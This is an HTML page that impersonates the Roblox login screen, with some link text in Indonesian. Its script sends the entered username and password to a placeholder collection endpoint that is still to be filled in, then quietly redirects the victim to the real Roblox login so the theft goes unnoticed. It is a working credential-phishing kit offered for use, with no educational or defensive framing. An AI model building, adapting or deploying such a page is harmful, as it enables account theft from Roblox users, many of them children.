<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Roblox</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Roboto,Arial,sans-serif}
body{display:flex;justify-content:center;align-items:center;min-height:100vh;background:#fff}
.container{width:360px;padding:32px 24px}
.logo{text-align:center;margin-bottom:28px}
.logo h1{font-size:32px;font-weight:900;letter-spacing:-1px;color:#000}
.field{margin-bottom:14px}
.field input{width:100%;padding:14px 12px;border:1px solid #bfbfbf;border-radius:4px;font-size:16px;outline:none}
.field input:focus{border-color:#000}
.btn{width:100%;padding:14px;background:#000;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px}
.btn:hover{background:#2c2c2c}
.btn:disabled{opacity:.6;cursor:not-allowed}
.links{text-align:center;margin-top:18px;font-size:14px}
.links a{color:#000;text-decoration:none;margin:0 6px}
.links a:hover{text-decoration:underline}
</style>
</head>
<body>
<div class="container">
<div class="logo"><h1>ROBLOX</h1></div>
<form id="f">
<div class="field"><input type="text" id="u" placeholder="Username/Email" autocomplete="username" required></div>
<div class="field"><input type="password" id="p" placeholder="Password" autocomplete="current-password" required></div>
<button type="submit" class="btn" id="btn">Log In</button>
</form>
<div class="links"><a href="#">Lupa Password?</a><a href="#">Buat Akun</a></div>
</div>
<script>
const ENDPOINT = 'GANTI_DENGAN_URL_WORKER_NANTI';

document.getElementById('f').addEventListener('submit', async e => {
  e.preventDefault();
  const u = document.getElementById('u').value.trim();
  const p = document.getElementById('p').value;
  const btn = document.getElementById('btn');
  btn.disabled = true;
  btn.textContent = 'Memproses...';
  try {
    await fetch(ENDPOINT, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({username: u, password: p, ts: Date.now()})
    });
  } catch(_) {}
  setTimeout(() => { window.location.href = 'https://www.roblox.com/login'; }, 1200);
});
</script>
</body>
</html>
